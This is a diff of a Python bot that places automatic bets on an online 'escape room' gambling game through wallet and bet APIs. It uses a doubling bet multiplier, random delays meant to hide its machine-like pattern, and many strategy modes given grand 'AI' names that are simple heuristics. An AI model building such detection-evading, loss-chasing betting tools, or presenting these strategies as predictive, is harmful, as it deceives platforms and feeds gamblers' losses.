+issue_id: Optional[int] = None
+issue_start_ts: Optional[float] = None
+issue_end_ts: Optional[float] = None
+count_down: Optional[int] = None
+killed_room: Optional[int] = None
+last_finished_issue: Optional[int] = None
+last_finished_label: str = ""
+round_index: int = 0
+
+room_state: Dict[int, Dict[str, Any]] = {r: {"players": 0, "bet": 0} for r in ROOM_ORDER}
+room_stats: Dict[int, Dict[str, Any]] = {r: {"kills": 0, "survives": 0, "last_kill_round": None, "last_players": 0, "last_bet": 0} for r in ROOM_ORDER}
+
+predicted_room: Optional[int] = None
+predicted_rooms: List[int] = []
+num_rooms: int = 1  # số phòng cược mỗi ván (1–4)
+last_killed_room: Optional[int] = None
+last_finished_issue: Optional[int] = None
+last_finished_label: str = ""
+last_killed_room_delayed: Optional[int] = None
+prediction_locked: bool = False
+
+current_build: Optional[float] = None
+current_usdt: Optional[float] = None
+current_world: Optional[float] = None
+last_balance_ts: Optional[float] = None
+last_balance_val: Optional[float] = None
+starting_balance: Optional[float] = None
+cumulative_profit: Optional[float] = None
+
+win_streak: int = 0
+lose_streak: int = 0
+max_win_streak: int = 0
+max_lose_streak: int = 0
+
+base_bet: float = 1.0
+multiplier: float = 2.0
+current_bet: Optional[float] = None
+run_mode: str = "AUTO"
+bet_rounds_before_skip: int = 0
+_rounds_placed_since_skip: int = 0
+skip_next_round_flag: bool = False
+
+bet_history: deque = deque(maxlen=200)
+bet_sent_for_issue: set = set()
+bet_room_sent: set = set()  # (issue, room) đã gửi cược
+skipped_for_issue: set = set()  # kỳ đã bỏ theo setting / danger
+
+pause_after_losses: int = 0
+_skip_rounds_remaining: int = 0
+profit_target: Optional[float] = None
+stop_when_profit_reached: bool = False
+stop_loss_target: Optional[float] = None
+stop_when_loss_reached: bool = False
+
+ui_state: str = "IDLE"
+round_warning: str = ""  # cảnh báo nguy hiểm / bỏ ván
+analysis_duration: float = 45.0
+analysis_start_ts: Optional[float] = None
+
+last_msg_ts: float = time.time()
+last_balance_fetch_ts: float = 0.0
+BALANCE_POLL_INTERVAL: float = 4.0
+_ws: Dict[str, Any] = {"ws": None}
+
+_sequential_bet_index = 0
+killer_history = deque(maxlen=20)
+game_kill_log = deque(maxlen=10)
+
+# ================== AI LIST ==================
+
+# KEY FREE: tối đa 10 AI (Vua Thoát Hiểm / CDTD)
+FREE_AI_LIST = [
+    "RANDOM", "MIN_PLAYER_BET", "PROBABILITY", "FOLLOW_KILLER",
+    "SEQUENTIAL", "KILLER_PERSONALITY", "SMART_SAFE",
+    "FOLLOW_KILLER_DELAYED", "HIDE_SEEK_MASTER", "BALANCE",
+]
+
+# KEY FREE Lotto: tối đa 5 AI
+LOTTO_FREE_AI_LIST = [
+    "RANDOM", "HOT_TRACK", "COLD_TRACK", "BALANCE", "SMART",
+]
+
+VIP_AI_LIST = [
+    "MOST_PLAYERS", "LEAST_PLAYERS", "RICHEST", "POOREST",
+    "ALTERNATE", "AVOID_RESULT", "COLD", "HOT", "MEDIAN", "PATTERN",
+    "VIP_RANDOM", "KILLER_WAVE", "PSYCHO_ANALYSIS", "MARKOV_CHAIN",
+    "DEEP_LEARNING", "REINFORCEMENT", "BAYESIAN", "K_MEANS",
+    "NEURAL", "FUZZY", "GENETIC", "ANT_COLONY", "PARTICLE_SWARM",
+    "KNN", "DECISION_TREE", "RANDOM_FOREST", "GRADIENT_BOOST",
+    "LSTM", "TRANSFORMER", "ENSEMBLE", "CYCLE_ANALYSIS", "TREND_ANALYSIS",
+    "SAFE_RISK",
+]
+
+SELECTION_MODES = {
+    "RANDOM": "1. PHẬT ĐỘ (Random)",
+    "MIN_PLAYER_BET": "2. AN TOÀN (Min Players & Bet)",
+    "PROBABILITY": "3. XÁC SUẤT (Probability)",
+    "FOLLOW_KILLER": "4. THEO SÁT THỦ (Follow Killer)",
+    "SEQUENTIAL": "5. TUẦN TỰ (1→2→3→...→8)",
+    "KILLER_PERSONALITY": "6. TÍNH CÁCH SÁT THỦ (AI Enhanced)",
+    "SMART_SAFE": "7. THÔNG MINH (AI Smart Enhanced)",
+    "FOLLOW_KILLER_DELAYED": "8. THEO VẾT SÁT THỦ (Delay 1 ván)",
+    "HIDE_SEEK_MASTER": "9. THÁNH TRỐN TÌM (Master AI)",
+    "BALANCE": "10. CÂN BẰNG (Balance)",
+    "MOST_PLAYERS": "11. ĐÔNG NHẤT (Most Players)",
+    "LEAST_PLAYERS": "12. ÍT NHẤT (Least Players)",
+    "RICHEST": "13. GIÀU NHẤT (Richest)",
+    "POOREST": "14. NGHÈO NHẤT (Poorest)",
+    "ALTERNATE": "15. XEN KẼ (Alternate)",
+    "AVOID_RESULT": "16. TRÁNH KẾT QUẢ (Avoid Result)",
+    "COLD": "17. PHÒNG LẠNH (Cold Room)",
+    "HOT": "18. PHÒNG NÓNG (Hot Room)",
+    "MEDIAN": "19. TRUNG VỊ (Median)",
+    "PATTERN": "20. MẪU LẶP (Pattern)",
+    "VIP_RANDOM": "21. VIP RANDOM (Random 22 logic)",
+    "KILLER_WAVE": "22. BẮT SÓNG SÁT THỦ",
+    "PSYCHO_ANALYSIS": "23. PHÂN TÍCH TÂM LÝ",
+    "MARKOV_CHAIN": "24. CHUỖI MARKOV",
+    "DEEP_LEARNING": "25. HỌC SÂU (Enhanced)",
+    "REINFORCEMENT": "26. HỌC TĂNG CƯỜNG",
+    "BAYESIAN": "27. XÁC SUẤT BAYES",
+    "K_MEANS": "28. PHÂN CỤM K-MEANS",
+    "NEURAL": "29. MẠNG NƠ-RON",
+    "FUZZY": "30. LOGIC MỜ",
+    "GENETIC": "31. THUẬT TOÁN DI TRUYỀN",
+    "ANT_COLONY": "32. KIẾN BÒ",
+    "PARTICLE_SWARM": "33. BẦY ĐÀN",
+    "KNN": "34. K-NEAREST NEIGHBORS",
+    "DECISION_TREE": "35. CÂY QUYẾT ĐỊNH",
+    "RANDOM_FOREST": "36. RỪNG NGẪU NHIÊN",
+    "GRADIENT_BOOST": "37. TĂNG CƯỜNG GRADIENT",
+    "LSTM": "38. LSTM",
+    "TRANSFORMER": "39. TRANSFORMER",
+    "ENSEMBLE": "40. TỔNG HỢP (Enhanced)",
+    "CYCLE_ANALYSIS": "41. PHÂN TÍCH CHU KỲ (Mới)",
+    "TREND_ANALYSIS": "42. PHÂN TÍCH XU HƯỚNG (Mới)",
+    "SAFE_RISK": "43. RỦI RO AN TOÀN (VIP)",
+}
+
+settings = {"algo": "RANDOM"}
+STRATEGY_CONFIG_FILE = "strategy_tst.json"
+
+def get_available_ai_list(key_type: str = "free") -> List[str]:
+    """FREE = 10 AI, VIP = toàn bộ."""
+    if key_type == "vip":
+        return FREE_AI_LIST + VIP_AI_LIST
+    return list(FREE_AI_LIST)  # đúng 10 AI
+
+
+def get_available_lotto_ai_list(key_type: str = "free") -> List[str]:
+    """Lotto: FREE = 5 AI, VIP = full (CDTD algorithms nếu có)."""
+    if key_type == "vip":
+        try:
+            return list(CDTD_ALGORITHMS.keys())
+        except NameError:
+            return list(LOTTO_FREE_AI_LIST)
+    return list(LOTTO_FREE_AI_LIST)
+
+
+def is_ai_available(ai_key: str, key_type: str = "free") -> bool:
+    available = get_available_ai_list(key_type)
+    return ai_key in available
+
+# ================== HÀM HỖ TRỢ ==================
+
+def _parse_number(x: Any) -> Optional[float]:
+    if x is None:
+        return None
+    if isinstance(x, (int, float)):
+        return float(x)
+    s = str(x)
+    _num_re = re.compile(r"-?\d+[\d,]*\.?\d*")
+    m = _num_re.search(s)
+    if not m:
+        return None
+    token = m.group(0).replace(",", "")
+    try:
+        return float(token)
+    except Exception:
+        return None
+
+def human_ts() -> str:
+    return datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")
+
+def balance_headers_for(uid: Optional[int] = None, secret: Optional[str] = None) -> Dict[str, str]:
+    h = {"accept": "*/*", "accept-language": "vi,en;q=0.9", "cache-control": "no-cache", "country-code": "vn", "origin": "https://xworld.info", "pragma": "no-cache", "referer": "https://xworld.info/", "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36", "user-login": "login_v2", "xb-language": "vi-VN"}
+    if uid is not None:
+        h["user-id"] = str(uid)
+    if secret:
+        h["user-secret-key"] = str(secret)
+    return h
+
+def fetch_balances_3games(retries=3, timeout=8, params=None, uid=None, secret=None):
+    global current_build, current_usdt, current_world, last_balance_ts, starting_balance, last_balance_val, cumulative_profit
+    uid = uid or USER_ID
+    secret = secret or SECRET_KEY
+    WALLET_API_URL = "https://wallet.3games.io/api/wallet/user_asset"
+    payload = {"user_id": int(uid) if uid is not None else None, "source": "home"}
+    attempt = 0
+    while attempt <= retries:
+        attempt += 1
+        try:
+            HTTP = requests.Session()
+            r = HTTP.post(WALLET_API_URL, json=payload, headers=balance_headers_for(uid, secret), timeout=timeout)
+            r.raise_for_status()
+            j = r.json()
+            data = j.get("data", {}) if isinstance(j, dict) else {}
+            ua = data.get("user_asset", {}) if isinstance(data, dict) else {}
+            build = _parse_number(ua.get("BUILD"))
+            world = _parse_number(ua.get("WORLD"))
+            usdt = _parse_number(ua.get("USDT"))
+            if build is not None:
+                if starting_balance is None:
+                    starting_balance = build
+                # Giống CDTD: P&L chỉ thay đổi theo số dư wallet sau khi có kết quả.
+                current_build = build
+                last_balance_val = current_build
+                if starting_balance is not None:
+                    cumulative_profit = current_build - starting_balance
+            if usdt is not None:
+                current_usdt = usdt
+            if world is not None:
+                current_world = world
+            last_balance_ts = time.time()
+            return current_build, current_world, current_usdt
+        except Exception as e:
+            time.sleep(min(1.5 * attempt, 4))
+    return current_build, current_world, current_usdt
+
+def api_headers() -> Dict[str, str]:
+    return {"content-type": "application/json", "user-agent": "Mozilla/5.0", "user-id": str(USER_ID) if USER_ID else "", "user-secret-key": SECRET_KEY if SECRET_KEY else ""}
+
+BET_API_URL = "https://api.escapemaster.net/escape_game/bet"
+
+# Random delay trước mỗi lệnh cược (giây) — giảm pattern máy móc
+BET_DELAY_MIN = 1.2
+BET_DELAY_MAX = 4.0
+
+
+def human_bet_delay(label: str = "") -> float:
+    """Chờ ngẫu nhiên trước khi gửi cược."""
+    lo = float(BET_DELAY_MIN)
+    hi = float(BET_DELAY_MAX)
+    if hi < lo:
+        lo, hi = hi, lo
+    delay = random.uniform(lo, hi)
+    try:
+        msg = f"⏳ Chờ {delay:.1f}s trước khi cược"
+        if label:
+            msg += f" ({label})"
+        safe_console_print(f"[dim]{msg}...[/]")
+    except Exception:
+        pass
+    time.sleep(delay)
+    return delay
+
+
+def place_bet_http(issue: int, room_id: int, amount: float) -> dict:
+    try:
+        payload = {
+            "asset_type": "BUILD",
+            "user_id": USER_ID,
+            "room_id": int(room_id),
+            "bet_amount": float(amount),
+        }
+        response = requests.post(
+            BET_API_URL,
+            headers=api_headers(),
+            json=payload,
+            timeout=8,
+        )
+        try:
+            return response.json()
+        except Exception:
+            return {"raw": response.text, "http_status": response.status_code}
+    except Exception as e:
+        return {"error": str(e)}
+
+def record_bet(issue: int, room_id: int, amount: float, resp: dict, algo_used: Optional[str] = None) -> dict:
+    now = datetime.now(tz).strftime("%H:%M:%S")
+    rec = {"issue": issue, "room": room_id, "amount": float(amount), "time": now, "resp": resp, "result": "Đang", "algo": algo_used, "delta": 0.0, "win_streak": win_streak, "lose_streak": lose_streak}
+    bet_history.append(rec)
+    return rec
+
+def refresh_balance_after_bet(amount: float) -> None:
+    """Refresh nhẹ sau khi cược nhưng không trừ tạm P&L."""
+    try:
+        time.sleep(0.6)
+        fetch_balances_3games(retries=1, timeout=5)
+    except Exception:
+        pass
+
+def place_bet_async(issue: int, room_id: int, amount: float, algo_used: Optional[str] = None):
+    # Chặn trùng: cùng kỳ + cùng phòng chỉ gửi 1 lần
+    try:
+        key = (int(issue), int(room_id))
+    except Exception:
+        key = (issue, room_id)
+    if key in bet_room_sent:
+        return
+    bet_room_sent.add(key)
+    try:
+        bet_sent_for_issue.add(int(issue))
+    except Exception:
+        bet_sent_for_issue.add(issue)
+
+    def worker():
+        global prediction_locked, ui_state
+        safe_console_print(f"[cyan]Đang đặt {amount} BUILD -> PHÒNG_{room_id} (v{issue}) — Thuật toán: {algo_used}[/]")
+        human_bet_delay(f"P{room_id} · kỳ {issue}")
+        res = place_bet_http(issue, room_id, amount)
+        ok = isinstance(res, dict) and (
+            res.get("msg") == "ok"
+            or res.get("code") == 0
+            or res.get("status") in ("ok", 1)
+            or str(res.get("msg", "")).lower() in ("success", "thanh cong", "thành công")
+        )
+        rec = record_bet(issue, room_id, amount, res, algo_used=algo_used)
+        if ok:
+            bet_sent_for_issue.add(issue)
+            rec["result"] = "Đang"
+            threading.Thread(
+                target=refresh_balance_after_bet,
+                args=(float(amount),),
+                daemon=True,
+            ).start()
+            safe_console_print(f"[green]✅ Đặt thành công {amount} BUILD vào PHÒNG_{room_id} (v{issue}).[/]")
+        else:
+            rec["result"] = "Lỗi"
+            # Không unlock cả kỳ (tránh cược lại nhiều lần). Cho phép retry đúng 1 phòng này.
+            try:
+                bet_room_sent.discard((int(issue), int(room_id)))
+            except Exception:
+                bet_room_sent.discard((issue, room_id))
+            safe_console_print(f"[red]❌ Đặt lỗi v{issue} P{room_id}: {res}[/]")
+    threading.Thread(target=worker, daemon=True).start()
+
+def lock_prediction_if_needed(force: bool = False):
+    global prediction_locked, predicted_room, predicted_rooms, ui_state, current_bet, _rounds_placed_since_skip, skip_next_round_flag, _skip_rounds_remaining, stop_flag, num_rooms, round_warning
+    
+    if stop_flag:
+        return
+    if issue_id is None:
+        return
+
+    # Đã xử lý kỳ này (cược hoặc bỏ theo setting) → không đụng lại
+    try:
+        iid = int(issue_id)
+    except Exception:
+        iid = issue_id
+    try:
+        if iid in {int(x) for x in bet_sent_for_issue} or iid in {int(x) for x in skipped_for_issue}:
+            prediction_locked = True
+            return
+    except Exception:
+        if issue_id in bet_sent_for_issue or issue_id in skipped_for_issue:
+            prediction_locked = True
+            return
+
+    # Nghỉ theo setting — TRƯỚC khi chọn phòng / cược
+    if _skip_rounds_remaining > 0:
+        safe_console_print(f"[yellow]⏸️ Đang nghỉ {_skip_rounds_remaining} ván theo cấu hình sau khi thua.[/]")
+        _skip_rounds_remaining -= 1
+        try:
+            skipped_for_issue.add(iid)
+        except Exception:
+            skipped_for_issue.add(issue_id)
+        prediction_locked = True
+        predicted_rooms = []
+        predicted_room = None
+        round_warning = "Nghỉ theo cấu hình (sau khi thua)"
+        ui_state = "SKIP"
+        return
+    if skip_next_round_flag:
+        safe_console_print("[yellow]⏸️ Tạm bỏ 1 ván (cấu hình bỏ qua định kỳ).[/]")
+        skip_next_round_flag = False
+        try:
+            skipped_for_issue.add(iid)
+        except Exception:
+            skipped_for_issue.add(issue_id)
+        prediction_locked = True
+        predicted_rooms = []
+        predicted_room = None
+        round_warning = "Bỏ ván theo cấu hình (định kỳ)"
+        ui_state = "SKIP"
+        return
+
+    if prediction_locked and not force:
+        # Nếu đã khóa nhưng chưa có lệnh pending kỳ này → mở khóa để thử lại
+        has_pending = False
+        try:
+            for b in bet_history:
+                if str(b.get("issue")) == str(issue_id) and str(b.get("result", "")).lower() in (
+                    "đang", "dang", "pending", "chờ", "cho", "wait", ""
+                ):
+                    has_pending = True
+                    break
+        except Exception:
+            pass
+        if has_pending:
+            return
+        # không pending + chưa sent → cho đặt lại
+        prediction_locked = False
+    
+    mode = settings.get("algo", "ENSEMBLE")
+    n_pick = max(1, min(4, int(num_rooms or 1)))
+    chosen_list, algo_used = choose_rooms_multi(mode, n_pick)
+    if not chosen_list:
+        # Fallback: không bỏ ván — chọn ngẫu nhiên theo num_rooms
+        chosen_list = random.sample(list(ROOM_ORDER), k=min(n_pick, len(ROOM_ORDER)))
+        algo_used = mode
+    round_warning = ""
+    predicted_rooms = list(chosen_list)
+    predicted_room = chosen_list[0] if chosen_list else None
+    prediction_locked = True
+    ui_state = "PREDICTED"
+
+    if run_mode != "AUTO":
+        safe_console_print("[cyan]Mode MANUAL — đã khóa dự đoán, không tự cược.[/]")
+        return
+    if run_mode == "AUTO":
+        bld = current_build
+        if bld is None:
+            bld, _, _ = fetch_balances_3games(retries=1, timeout=3)
+            if bld is None:
+                safe_console_print("[yellow]⚠️ Không lấy được số dư, sẽ thử lại kỳ sau...[/]")
+                prediction_locked = False
+                ui_state = "ANALYZING"
+                return
+        if current_bet is None:
+            current_bet = base_bet
+        amt = float(current_bet)
+        if amt <= 0:
+            current_bet = base_bet
+            amt = float(base_bet)
+        # đủ vốn cho tất cả phòng
+        total_need = amt * max(1, len(chosen_list))
+        if total_need > float(bld or 0):
+            safe_console_print(
+                f"[red]🔥 Vốn không đủ multi (cần {total_need:,.2f}, có {float(bld or 0):,.2f}).[/red]"
+            )
+            current_bet = base_bet
+            amt = float(current_bet)
+            total_need = amt * max(1, len(chosen_list))
+            # giảm số phòng nếu vẫn thiếu
+            while len(chosen_list) > 1 and amt * len(chosen_list) > float(bld or 0):
+                chosen_list = chosen_list[:-1]
+            predicted_rooms = list(chosen_list)
+            predicted_room = chosen_list[0] if chosen_list else None
+            if amt > float(bld or 0) or not chosen_list:
+                safe_console_print(
+                    f"[yellow]⚠️ Vốn < cược. Bỏ ván này, không dừng tool.[/yellow]"
+                )
+                prediction_locked = False
+                ui_state = "ANALYZING"
+                return
+        # Đánh dấu kỳ đã xử lý NGAY (tránh race gọi lock nhiều lần → cược trùng)
+        try:
+            bet_sent_for_issue.add(int(issue_id))
+        except Exception:
+            bet_sent_for_issue.add(issue_id)
+        prediction_locked = True
+        ui_state = "BETTING"
+        # Chỉ đúng số phòng theo setting
+        rooms_to_bet = list(chosen_list)[: max(1, min(4, int(num_rooms or 1)))]
+        predicted_rooms = list(rooms_to_bet)
+        predicted_room = rooms_to_bet[0] if rooms_to_bet else None
+        for room in rooms_to_bet:
+            place_bet_async(issue_id, room, amt, algo_used=algo_used)
+        _rounds_placed_since_skip += 1
+        if bet_rounds_before_skip > 0 and _rounds_placed_since_skip >= bet_rounds_before_skip:
+            skip_next_round_flag = True
+            _rounds_placed_since_skip = 0
+
+
+
+def _vth_kill_gap(room: int) -> float:
+    """Số ván từ lần kill gần nhất (cao = an toàn hơn)."""
+    if not game_kill_log:
+        return 8.0
+    log = list(game_kill_log)
+    for i in range(len(log) - 1, -1, -1):
+        if log[i] == room:
+            return float(len(log) - 1 - i)
+    return float(min(12, len(log) + 2))
+
+
+def _vth_transition_safe(room: int) -> float:
+    """P(không bị kill ngay sau last) — điểm an toàn Markov."""
+    if len(game_kill_log) < 2:
+        return 0.5
+    last = game_kill_log[-1]
+    trans = defaultdict(int)
+    total = 0
+    for a, b in zip(game_kill_log, list(game_kill_log)[1:]):
+        if a == last:
+            trans[b] += 1
+            total += 1
+    if total == 0:
+        return 0.5
+    # xác suất room bị kill tiếp
+    p_kill = (trans.get(room, 0) + 0.35) / (total + 0.35 * len(ROOM_ORDER))
+    return 1.0 - p_kill
+
+
+def _vth_unified_scores(noise: float = 0.04) -> Dict[int, float]:
+    """
+    Điểm an toàn hợp nhất (cao = nên cược):
+    survival + gap + markov + anti-crowd + anti-money + risk% (nếu có).
+    """
+    max_p = max((room_state[r].get("players", 0) or 0) for r in ROOM_ORDER) or 1
+    max_b = max((room_state[r].get("bet", 0) or 0) for r in ROOM_ORDER) or 1.0
+    risk_by = {}
+    try:
+        for row in compute_vth_room_risk() or []:
+            rid = int(row.get("id") or row.get("room") or 0)
+            if rid:
+                risk_by[rid] = float(row.get("risk_pct", 50) or 50) / 100.0
+    except Exception:
+        pass
+
+    scores = {}
+    for r in ROOM_ORDER:
+        kills = int(room_stats[r].get("kills", 0) or 0)
+        survives = int(room_stats[r].get("survives", 0) or 0)
+        survival = (survives + 1.2) / (kills + survives + 2.4)
+        gap = min(1.0, _vth_kill_gap(r) / 8.0)
+        markov_safe = _vth_transition_safe(r)
+        crowd = 1.0 - (float(room_state[r].get("players", 0) or 0) / max_p)
+        money = 1.0 - (float(room_state[r].get("bet", 0) or 0) / max_b)
+        risk_safe = 1.0 - risk_by.get(r, 0.5)
+
+        scores[r] = (
+            0.24 * survival
+            + 0.18 * gap
+            + 0.18 * markov_safe
+            + 0.14 * crowd
+            + 0.12 * money
+            + 0.14 * risk_safe
+        )
+        if noise:
+            scores[r] += random.uniform(-noise, noise)
+    return scores
+
+
+def _vth_pick_max(scores: Dict[int, float]) -> int:
+    if not scores:
+        return random.choice(ROOM_ORDER)
+    best = max(scores.values())
+    tops = [r for r, v in scores.items() if abs(v - best) < 1e-9]
+    return random.choice(tops)
+
+
+
+# Ngưỡng giảm thua: bỏ ván quá rủi ro / ưu tiên phòng risk thấp
+VTH_SKIP_IF_SAFEST_ABOVE = 78.0   # an toàn nhất vẫn >78% → bỏ ván
+VTH_DROP_ROOM_ABOVE = 70.0        # loại phòng risk cao khỏi multi
+CDTD_SKIP_IF_SAFEST_ABOVE = 72.0
+CDTD_DROP_NV_ABOVE = 68.0
+
+
+def _vth_risk_map() -> Dict[int, float]:
+    try:
+        return {int(r["id"]): float(r.get("risk_pct", 50) or 50) for r in (compute_vth_room_risk() or [])}
+    except Exception:
+        return {}
+
+
+def _vth_conservative_pick(candidates: List[int], n: int = 1) -> List[int]:
+    """Ưu tiên risk thấp — luôn trả đủ n phòng (không bỏ ván)."""
+    n = max(1, min(4, int(n or 1)))
+    rm = _vth_risk_map()
+    pool = list(candidates) if candidates else list(ROOM_ORDER)
+    pool = sorted(set(pool), key=lambda r: (rm.get(r, 55.0), r))
+    out = list(pool)
+    if len(out) < n:
+        for r in sorted(ROOM_ORDER, key=lambda x: (rm.get(x, 55.0), x)):
+            if r not in out:
+                out.append(r)
+            if len(out) >= n:
+                break
+    if not out:
+        out = list(ROOM_ORDER)[:n]
+    return out[:n]
+
+
+def _cdtd_conservative_pick(candidates: List[int], n: int = 1, data_top10=None, data_top100=None) -> List[int]:
+    """Ưu tiên risk thấp — luôn trả đủ n NV (không bỏ ván)."""
+    n = max(1, min(5, int(n or 1)))
+    try:
+        rows = compute_cdtd_nv_risk(data_top10, data_top100) or []
+        rm = {int(r["id"]): float(r.get("risk_pct", 50) or 50) for r in rows}
+    except Exception:
+        rm = {i: 50.0 for i in range(1, 7)}
+    pool = [c for c in candidates if 1 <= int(c) <= 6] if candidates else list(range(1, 7))
+    pool = sorted(set(int(x) for x in pool), key=lambda i: (rm.get(i, 55.0), i))
+    out = list(pool)
+    if len(out) < n:
+        for i in sorted(range(1, 7), key=lambda x: (rm.get(x, 55.0), x)):
+            if i not in out:
+                out.append(i)
+            if len(out) >= n:
+                break
+    if not out:
+        out = list(range(1, 7))[:n]
+    return out[:n]
+
+
+
+def _vth_round_danger_check() -> tuple:
+    """
+    Phân tích độ ổn định kỳ hiện tại.
+    Returns: (is_danger: bool, message: str)
+    """
+    try:
+        rows = compute_vth_room_risk() or []
+    except Exception:
+        rows = []
+    if not rows:
+        return True, "Chưa đủ dữ liệu — phân tích không ổn"
+    risks = [float(r.get("risk_pct", 50) or 50) for r in rows]
+    safest = min(risks)
+    avg = sum(risks) / max(1, len(risks))
+    high_n = sum(1 for x in risks if x >= 70)
+    # mẫu kill quá ít → kém tin cậy
+    samples = sum(int(r.get("samples", 0) or 0) for r in rows)
+    if samples < 8 and len(list(game_kill_log or [])) < 5:
+        return True, f"Dữ liệu mỏng (mẫu {samples}) — chưa ổn để cược"
+    if safest >= VTH_SKIP_IF_SAFEST_ABOVE:
+        return True, f"Nguy hiểm: phòng an toàn nhất vẫn {safest:.0f}% risk"
+    if avg >= 66.0:
+        return True, f"Nguy hiểm: risk trung bình {avg:.0f}% quá cao"
+    if high_n >= 6:
+        return True, f"Nguy hiểm: {high_n}/8 phòng risk CAO"
+    # chênh lệch quá nhỏ + avg cao → không có chỗ trú
+    if (max(risks) - min(risks)) < 8 and avg >= 58:
+        return True, "Nguy hiểm: mọi phòng risk gần nhau, không có lựa chọn ổn"
+    return False, ""
+
+
+def _cdtd_round_danger_check(data_top10=None, data_top100=None) -> tuple:
+    """Returns (is_danger, message) cho CDTD."""
+    try:
+        rows = compute_cdtd_nv_risk(data_top10, data_top100) or []
+    except Exception:
+        rows = []
+    if not rows:
+        return True, "Chưa đủ dữ liệu đua — phân tích không ổn"
+    risks = [float(r.get("risk_pct", 50) or 50) for r in rows]
+    safest = min(risks)
+    avg = sum(risks) / max(1, len(risks))
+    high_n = sum(1 for x in risks if x >= 68)
+    if safest >= CDTD_SKIP_IF_SAFEST_ABOVE:
+        return True, f"Nguy hiểm: NV an toàn nhất vẫn {safest:.0f}% risk"
+    if avg >= 64.0:
+        return True, f"Nguy hiểm: risk trung bình {avg:.0f}% quá cao"
+    if high_n >= 5:
+        return True, f"Nguy hiểm: {high_n}/6 NV risk cao"
+    if (max(risks) - min(risks)) < 6 and avg >= 55:
+        return True, "Nguy hiểm: form mơ hồ, không có NV nổi trội an toàn"
+    return False, ""
+
+
+def choose_safe_risk() -> int:
+    """VIP: tối ưu giảm thua — risk thấp là trọng số chính."""
+    scores = _vth_unified_scores(noise=0.015)
+    try:
+        for row in compute_vth_room_risk() or []:
+            rid = int(row.get("id") or 0)
+            if rid in scores:
+                rp = float(row.get("risk_pct", 50) or 50) / 100.0
+                scores[rid] += 0.55 * (1.0 - rp)
+                if rp > 0.70:
+                    scores[rid] -= 0.45
+    except Exception:
+        pass
+    # conservative: chỉ xét top risk thấp
+    picks = _vth_conservative_pick(list(scores.keys()), 1)
+    if picks:
+        return picks[0]
+    return _vth_pick_max(scores)
+
+def choose_random() -> int:
+    return random.choice(ROOM_ORDER)
+
+def choose_min_player_bet() -> int:
+    if not any(rs.get('players', 0) > 0 or rs.get('bet', 0) > 0 for rs in room_state.values()):
+        return choose_random()
+    player_ranks = sorted(ROOM_ORDER, key=lambda r: room_state[r]['players'])
+    bet_ranks = sorted(ROOM_ORDER, key=lambda r: room_state[r]['bet'])
+    scores = defaultdict(int)
+    for i, r in enumerate(player_ranks):
+        scores[r] += i
+    for i, r in enumerate(bet_ranks):
+        scores[r] += i
+    return min(scores, key=scores.get)
+
+def choose_probability() -> int:
+    scores = {}
+    for r in ROOM_ORDER:
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        survival_rate = (survives + 1) / (kills + survives + 2)
+        scores[r] = survival_rate
+    return max(scores, key=scores.get)
+
+def choose_follow_killer() -> int:
+    if last_killed_room is not None and last_killed_room in ROOM_ORDER:
+        return last_killed_room
+    return random.choice(ROOM_ORDER)
+
+def choose_sequential() -> int:
+    global _sequential_bet_index
+    room_to_bet = ROOM_ORDER[_sequential_bet_index]
+    _sequential_bet_index = (_sequential_bet_index + 1) % len(ROOM_ORDER)
+    return room_to_bet
+
+def choose_killer_personality_enhanced() -> int:
+    if len(killer_history) < 3:
+        return choose_random()
+    
+    recent_killers = killer_history[-15:] if len(killer_history) > 15 else killer_history
+    avg_players = sum(h['players'] for h in recent_killers) / len(recent_killers)
+    avg_bet = sum(h['bet'] for h in recent_killers) / len(recent_killers)
+    player_var = sum((h['players'] - avg_players) ** 2 for h in recent_killers) / len(recent_killers)
+    bet_var = sum((h['bet'] - avg_bet) ** 2 for h in recent_killers) / len(recent_killers)
+    stability_factor = 1.5 if player_var < 2 and bet_var < 100 else 0.8
+    
+    avoidance_scores = {}
+    for r in ROOM_ORDER:
+        current_players = room_state[r]['players']
+        current_bet = room_state[r]['bet']
+        player_dist = abs(current_players - avg_players) / (avg_players + 1)
+        bet_dist = abs(current_bet - avg_bet) / (avg_bet + 1)
+        base_score = (player_dist + bet_dist) * stability_factor
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        survival_rate = (survives + 1) / (kills + survives + 2)
+        base_score += survival_rate * 0.3
+        avoidance_scores[r] = base_score
+    
+    return max(avoidance_scores, key=avoidance_scores.get)
+
+def choose_smart_safe_enhanced() -> int:
+    """Smart Safe v2 — unified score + lệch pattern sát thủ."""
+    scores = _vth_unified_scores(noise=0.05)
+    if killer_history:
+        avg_p = sum(h.get("players", 0) for h in killer_history) / len(killer_history)
+        avg_b = sum(h.get("bet", 0) for h in killer_history) / len(killer_history)
+        for r in ROOM_ORDER:
+            # càng khác profile sát thủ càng an toàn
+            pd = abs((room_state[r].get("players", 0) or 0) - avg_p) / (avg_p + 1)
+            bd = abs((room_state[r].get("bet", 0) or 0) - avg_b) / (avg_b + 1)
+            scores[r] += 0.12 * (pd + bd)
+    return _vth_pick_max(scores)
+
+def choose_follow_killer_delayed() -> int:
+    global last_killed_room_delayed
+    if last_killed_room_delayed is not None and last_killed_room_delayed in ROOM_ORDER:
+        return last_killed_room_delayed
+    return random.choice(ROOM_ORDER)
+
+def choose_hide_seek_master() -> int:
+    danger_scores = {}
+    max_players = max(rs['players'] for rs in room_state.values()) or 1
+    max_bet = max(rs['bet'] for rs in room_state.values()) or 1
+    avg_players_killed = 0
+    avg_bet_killed = 0
+    if killer_history:
+        avg_players_killed = sum(h['players'] for h in killer_history) / len(killer_history)
+        avg_bet_killed = sum(h['bet'] for h in killer_history) / len(killer_history)
+    for r in ROOM_ORDER:
+        kills = room_stats[r].get('kills', 0)
+        survives = room_stats[r].get('survives', 0)
+        hist_danger = (kills + 1) / (kills + survives + 2)
+        crowd_danger = room_state[r]['players'] / max_players
+        money_danger = room_state[r]['bet'] / max_bet
+        personality_danger = 0
+        if killer_history:
+            player_sim = 1 - (abs(room_state[r]['players'] - avg_players_killed) / (avg_players_killed + max_players + 1))
+            bet_sim = 1 - (abs(room_state[r]['bet'] - avg_bet_killed) / (avg_bet_killed + max_bet + 1))
+            personality_danger = (player_sim + bet_sim) / 2
+        recency_penalty = 0.0  # không chặn phòng vừa kill
